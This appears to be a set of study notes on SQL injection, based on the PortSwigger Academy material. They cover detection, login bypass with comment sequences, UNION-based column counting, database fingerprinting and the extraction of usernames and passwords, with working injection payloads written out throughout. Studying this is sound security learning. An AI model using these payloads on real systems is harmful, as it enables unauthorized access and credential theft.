# Structure Query Language injection

## What is SQL injection (SQLi)?

* SQLi is a web security vulnerability that allows an attacker to interfere with the query that an application makes to it's databases. it generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access.
* In many case an attacker modify or delete this data, causing persistent changes to the application's contents or behavior.

* In some situation, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a DOS attack.
    * Resource [DOS-attack](https://www.securityidiots.com/Web-Pentest/SQL-Injection/ddos-website-with-sqli-siddos.html)
    * Resource [DOS-Wildcard-attack](https://labs.portcullis.co.uk/download/DoS_Attacks_Using_SQL_Wildcards.pdf)

## How to detect SQL injection vulnerability :

* One of the method is to use Web Vulnerability Scanner (Burpsuit web vulnerability scanner).
* SQL injection can be detected manually be using a systematic set of tests against every entry point in the application. This typically involves:
    * Submitting the single quote or double quote `'` or `"` and looking for errors or other anomalies.
    * Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic difference in the resulting application responses.
    * Submitting Boolean conditions such as `OR 1=1` and `OR 1=2`, and looking for differences in the application's responses.
    * Submitting payload designed to trigger time delays when executed within a SQL query, and looking for difference in the time taken to response.
    * Submitting OAST payload designed to trigger an Out of band network interaction when executed within a SQL query, and monitoring for any resulting interactions.

## SQL injection in different parts of the query :

* Most SQL injection arises within the `WHERE` clause of a `SELECT` query. This type of SQL injection is generally well-understood by experienced testers.

* But SQL injection vulnerability can in principle occur at any location within the query, and within different query type. The most common other location Where injection arises are :
    * In `UPDATE` statements, within the updated values or the `WHERE` clause.
    * In `INSERT` statements, within the inserted values.
    * In `SELECT` statements, within the table or column name.
    * In `SELECT` statements, within the `ORDER BY` clause.

## Example of SQLi :

* Consider a sopping application that display products in different categories. when the user click on the Gifts category, their browser requests the URL:

```url
https://insucure-website.com/products?category=Gifts
```
* This causes the application to make a SQL query to retrieve details of the relevant product from the database:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND release = 1
```
* This SQL query ask the databases to return:
    * all details `*`
    * from the product table 
    * where the category is Gifts
    * and released is 1.

* The restriction `released = 1` is being used to hide product that are not released. For unreleased products, presumably `released = 0`.

* The application doesn't implement any defenses against SQLi attacks, so an attacker can construct an attack like :

```url
https://insecure-website.com/products?category=Gifts' --
```
* This result in the SQL query :

```sql
SELECT * FROM product WHERE category = 'Gifts' --' and released = 1
```
* The key thing here is the double-dash sequence `--` is a comment indicator in SQL, and means that the rest of the query is implemented as a comment. This effectively remove the remainder of the query, so it no longer includes `AND released = 1`. This means that all product are displayed, including unreleased products.

* Going further, an attacker can cause the application to display all the products in any categories that they don't know about:

```url
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```
* This result in the SQL query:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```
* This modified query will return all item where either the category is Gifts, or 1 is equal to 1. Since `1=1` is always true, the query will return all item.


## Subverting application logic :

* Consider an application that lets users log in with a username and password. If a user submits the username `wiener` and password `super_secure_password` the application checks the credentials by performing the following SQL query :
```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'super_secure_password' 
```

* If the query return the details of a user, then the login is successful. Otherwise, it is rejected.

* Here, an attacker can log in as any user without a password simply by using the SQL comment sequence `--` to remove the password check from the `WHERE` clause of the query. For example, submitting teh username `administrator ' --` and blank password result in the following query:

```sql
SELECT * FROM users WHERE username = 'administrator' --' password = ''
```
* This query will returns the user whose username is `administrator` and successfully logs the account.

## Retrieving data from other database table :

* In case where the result of a SQL query are returned within the application's responses, an attacker can leverage a SQL injection a SQL injection vulnerability to retrieve data from other tables within the databases. This is done using the `UNION` keyword, which lets you executes an additional `SELECT` query and append the results to the original query.

* For example, if an application executes the following query containing teh user input "Gifts":

```sql
SELECT name, description FROM products WHERE category = 'Gifts'
```
* Then an attacker can submit the input :

```sql
' UNION SELECT username, password FROM users--
```

* This will cause the application to return all username and passwords along with the name description of products.

## SQL injection UNION attacks :

* When an application is vulnerable to SQL injection and the result of the query are returned within the application's responses, the `UNION` keyword can be used to retrieve data from other tables within the database. This result in a SQL injection UNION attack.

* The `UNION` keyword lets you execute one or more additional `SELECT` queries and append the result to the original query. For example :

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```
* This SQL query will return a single result set with two columns, containing values from columns `a` and `b` in `table1` and column `c` and `d` in `table2`.

* For a `UNION` query to work, two key requirement must be met:
    * The individual queries must return the same number of columns.
    * The data types in each column must be compatible between the individual queries.

* To carry out a SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:
    * How many columns are being returned from the original query?
    * Which columns returned from the original query are of a suitable data type to hold the results from the injection query?

### Determining the number of columns required in a SQL injection UNION attack

* Whe performing a SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.

* The `first method` involve injecting a series of `ORDER BY` clause and incrementing the specified column index until an `error occur`. For example assuming the injection point is a quote string within the where clause of the original query, you would submit :

```sql 
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```

* This series of payloads modifies the original query to order the results by different columns in the result set.
* The column in an `ORDER BY` clause can be specified by it's index, so you don't need to know the name of any columns. When the specified column index exceeds the number of actual columns in the result set, the database return error such as :

```sql
the ORDER BY position number 3 is out of range of the number of items in the select list.
```
* The application might actually return the database error in it's HTTP response, or it might return a generic error. or simply return no result. Provided you can detect some difference in the application's response, you can infer how many columns are being returned from the query.

* Conclusion : we can identify the no of called `columns` in select statement by getting the exceed `ORDER BY ` number.

* The `Second method` involves submitting a series of `UNION SELECT` payload specifying a difference number of `NULL` values.

```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
etc.
```
* If the number of nulls does not match the number of columns, the database return an error such as :

```plain
All queries combined using a UNION, INTERSECT of EXCEPT operation must have an equal number of expression in their target list.
```
* Again, the application might actually return this error message, or might just return a generic error or no results. 
* When the number of nulls matches the number of columns, the databases return an additional row in the result set, containing null values in each column.
* The effect on the resulting HTTP response depends on the application's code. if you are lucky, you will see some additional content within the responses, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a `NullPointerException`. 
* Worst case, the response might be indistinguishable from that which is caused by an incorrect number of nulls, making this method of determining the column count ineffective. 

* NOTE :
  * The reason for using `NULL` as the values returned from the injected `SELECT` query is that the data types in each column must be compatible between the original and the injected queries. Since `NULL` is convertible to every commonly used data type, using `NULL` maximizes the chance that the payload will succeed when the columns count is correct.
  * An Oracle, every `SELECT` query must use the `FORM` keyword and specify a valid table. There is built-in table on oracle called `dual` which can used for this purpose. So the injected queries on Oracle would need to look like:
  ```Sql
  UNION SELECT NULL FROM DUAL-- 
  ``` 
  * The payload described use the double-dash comment sequence `--` to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character `#` can be used to identify a comment.
  * Resource : [SQLi Cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### Finding columns with a useful data type in a SQL injection UNION attack :

* The reason for performing a SQL injection `UNION` attack is to be able to retrieve the result from an injected query. Generally, the interesting data that you want to retrieve will be in single form, so you need to find one or more columns in the original query results whose data type is, or is compatible with string data.

* Having already determined the number of required columns, you can prove each columns to test wether it can hold `string` data by submitting a series of `UNION SELECT` payload that place a string value into each column in turn. For example. if Query returns four columns, you would submit :

```sql
' UNION SELECT 'a', NULL, NULL, NULL-- -
' UNION SELECT NULL, 'a', NULL, NULL-- -
' UNION SELECT NULL, NULL, 'a', NULL-- -
' UNION SELECT NULL, NULL, NULL, 'a'-- -
```
* If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:

```sql
Conversion failed when converting the varchar value 'a' to data type int. 
```

* If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.

#### ORDER BY AND UNION SELECT NULL :

* `ORDER BY`
    * IN `SQL` `ORDER BY` used to display the data from ascending or descending order, But when we pass the numbers in `ORDER BY 2` or `ORDER BY 3` or `ORDER BY 4` etc, it simply meaning that format the output in ascending or descending order for column `2` or `3` or `4`.
    * When the limit exceed : mean suppose a table name Customer has only 7 columns & we use the query` SELECT * FROM Customers ORDER BY 7; ` , It will display the output by formatting ascending order to `column 7`, Now What if we pass the query like : `SELECT * FROM Customer ORDER BY 8`, This will result the error, because there is only 7 columns in tables and we are trying the order the `8th` column which doesn't exist.
    * By this method we can guess how many columns are inside the table

* `UNION SELECT NULL, NULL....`
  * Using the `SELECT NULL` will also help us to know how many columns are called in query.
  * By adding the `UNION SELECT NULL,NULL...` we can determine how many columns are there.
  * This query `SELECT CustomerID, City, Address FROM Customers UNION SELECT NULL,NULL,NULL FROM Customers;` will return the fist row has empty value and rest of data will print from second row.
  * Injecting inside the `NULL` we can find the suitable column like `string`.
  * `SELECT CustomerID, City, Address FROM Customers UNION SELECT 'a',NULL,NULL FROM Customers;` This query will print output as the first row first column as 'a' and rest of the first row is null values, then the rest of data will print from the second row.

### Using a SQL injection UNION attack to retrieve interesting data

* When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.

* Suppose that :
    * The original query returns two columns both of which can hold string data. 
    * The injection point is a quoted string within `WHERE` clause. 
    * The database contains a table called users with the columns `username` and `password`.
* In this situation, you can retrieve the content of the `users` table by submitting the input:
```sql
' UNION SELECT username, password FROM users-- -
```
* Of course, the crucial information needed to perform this attack is that there is a table called `users` and two columns called `username` and `password`. Without this information, you would be left trying to guess the names of tables and columns. In fact, all modern databases provided ways of examining the databases structure to determine what tables and columns it contains.


### Examine the database in SQL injection attack :

* Resource : [Examining database](https://portswigger.net/web-security/sql-injection/examining-the-database)
* Resource : [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

* When exploiting SQL injection vulnerability, it is often necessary to gather some information about the database itself. This includes the type and version of the databases software, and the contents of the databases in terms of which tables and columns it contains.

#### Querying the database type and version :

* Different database provided different ways of querying their version. You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software.

* The query determining the database version for some popular databases types are as follows:

|Database type | Query |
|--------------|-------|
|Microsoft, MySQL| `SELECT @@version`|
| Oracle | `SELECT * FROM v$version` | 
| PostgreSQL | `SELECT version()` |

* For example you could use a `UNION` attack with the following input:

```sql
' UNION SELECT @@version -- -
```

* This might return output like the following, Confirming that the database is Microsoft SQL server, and the version that is being used:

```plain
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

#### Listing the content of the database :

* Most database type (with the notable exception of Oracle ) have set of views called `information schema` which provide information about the database.

* You can query `information_schema.tables` to list the tables in the databases:

```sql
SELECT * FROM information_schema.tables
```
* This return output like the following:

```plain
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```
* This output indicates that there is three tables, called `Products`, `Users` and `Feedback`.

* You can query `information_schema.columns` to list the columns in individual table:

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

```plain
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```
* This output will show the columns in the specified table and the data type of each column.

##### Equivalent to information schema on Oracle :

* On Oracle, you can obtain the same information with slightly different queries.
* You can list tables by querying `all_tables`:

```sql
SELECT * FROM all_tables
```

* And you can list columns by querying `all_tab_columns` :

```sql
SELECT * FROM all_tab_columns where table_name = 'USERS'
```

### Retrieving multiple values with a single column :

* In the preceding example, suppose instead that the query only return a single column.

* You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:

```sql
' UNION SELECT username || '~' || password FROM users -- -
```
* This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle. The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character.
* The results from the query will let you read all of the `usernames` and `passwords` for example : 

```plain 
...
administrator~s3cure
wiener~peter
carlos~montoya
...
```

> Example : A query for concatenation may look like this :-
```url
https://asdflka2304.web-security-academy.net/filter?category=' UNION SELECT NULL, username || ' ~ ' || password FROM users -- -
```

* Note that different databases use different syntax to perform string concatenation. 
* Resource : [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


### Blind SQL injection Vulnerability :

